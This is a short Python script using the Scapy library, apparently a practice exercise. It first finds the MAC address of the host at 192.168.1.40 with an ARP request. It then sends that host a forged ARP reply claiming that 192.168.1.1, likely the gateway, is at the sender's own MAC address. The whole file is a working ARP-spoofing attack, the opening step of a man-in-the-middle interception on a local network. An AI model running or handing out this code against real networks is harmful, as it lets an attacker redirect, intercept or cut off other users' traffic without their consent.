from scapy.all import *

bradcast = Ether(dst="ff:ff:ff:ff:ff:ff")
# bradcast.show()

arp_layer = ARP(pdst='192.168.1.40')
# arp_layer.show()

entirepacket = bradcast/arp_layer
# entirepacket.show()

answer = srp(entirepacket, timeout=2, verbose=True)[0]
# print(answer)
print(answer[0])
# print(answer[0][1])
# answer[0][1].show()

target_mac = answer[0][1].hwsrc
print(target_mac)

packet = ARP(op=2, hwdst=target_mac, pdst='192.168.1.40', psrc='192.168.1.1')
packet.show()

send(packet, verbose=False)